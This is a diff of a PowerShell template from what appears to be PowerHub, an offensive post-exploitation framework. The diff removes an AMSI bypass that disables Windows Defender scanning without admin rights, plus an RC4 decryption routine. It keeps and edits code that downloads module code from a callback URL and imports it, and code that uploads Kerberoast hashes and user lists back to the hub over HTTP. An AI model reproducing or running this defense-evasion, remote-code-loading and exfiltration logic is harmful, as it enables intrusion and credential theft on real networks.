@@ -1,26 +1,5 @@
 $ErrorActionPreference = "Stop"
-$CALLBACK_URL = "{{callback_url}}"
-$KEY = ([system.Text.Encoding]::UTF8).GetBytes("{{key}}")
 $PS_VERSION = $PSVersionTable.PSVersion.Major
-
-Write-Host @"
-  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
- |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
- |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
-                            written by Adrian Vollmer, 2018-2019
-Run 'Help-PowerHub' for help
-"@
-
-Try {
-    # Bypass Win10 Defender, no admin required
-    # Reqires some obfuscation
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSySSFailed'.replace('SySS','Init'),'NonPublic,Static').SetValue($null,$true)
-    Write-Host "[+] Disabled AMSI"
-} Catch {
-    Write-Host "[-] Failed to disable AMSI"
-}
-
-
 
 $Modules = @()
 {% if modules %}
@@ -34,46 +13,6 @@ $m.add('n', {{ m.n }})
 $Modules += $m
 {% endfor %}
 {% endif %}
-
-function Decrypt-Code {
-    # RC4
-    param(
-        [Byte[]]$buffer,
-        [Byte[]]$key
-  	)
-
-    $s = New-Object Byte[] 256;
-    $k = New-Object Byte[] 256;
-
-    for ($i = 0; $i -lt 256; $i++)
-    {
-        $s[$i] = [Byte]$i;
-        $k[$i] = $key[$i % $key.Length];
-    }
-
-    $j = 0;
-    for ($i = 0; $i -lt 256; $i++)
-    {
-        $j = ($j + $s[$i] + $k[$i]) % 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
-    }
-
-    $i = $j = 0;
-    for ($x = 0; $x -lt $buffer.Length; $x++)
-    {
-        $i = ($i + 1) % 256;
-        $j = ($j + $s[$i]) % 256;
-        $temp = $s[$i];
-        $s[$i] = $s[$j];
-        $s[$j] = $temp;
-        [int]$t = ($s[$i] + $s[$j]) % 256;
-        $buffer[$x] = $buffer[$x] -bxor $s[$t];
-    }
-
-    $buffer
-}
 
 function Unzip-Code {
      Param ( [byte[]] $byteArray )
@@ -222,7 +161,7 @@ Use the '-Verbose' option to print detailed information.
         if ($i -lt $Modules.length -and $i -ge 0) {
             $compression = "&c=1"
             if ($PS_VERSION -eq 2) { $compression = "" }
-            $url = "{0}?m={1}{2}" -f $CALLBACK_URL, $i, $compression
+            $url = "{0}m?m={1}{2}" -f $CALLBACK_URL, $i, $compression
             $Modules[$i]["code"] = $K.downloadstring($url);
             Import-HubModule $Modules[$i]
         }
@@ -339,7 +278,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
             "--$boundary--$LF"
         ) -join $LF
 
-        $url = $CALLBACK_URL.substring(0,$CALLBACK_URL.length-2)
+        $url = $CALLBACK_URL
         try {
             $response = Invoke-RestMethod -Uri $($url + "u") -Method "POST" -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
         } catch [System.Net.WebException] {
@@ -360,6 +299,3 @@ The following functions are available:
 Use 'Get-Help' to learn more about those functions.
 "@
 }
-
-
-
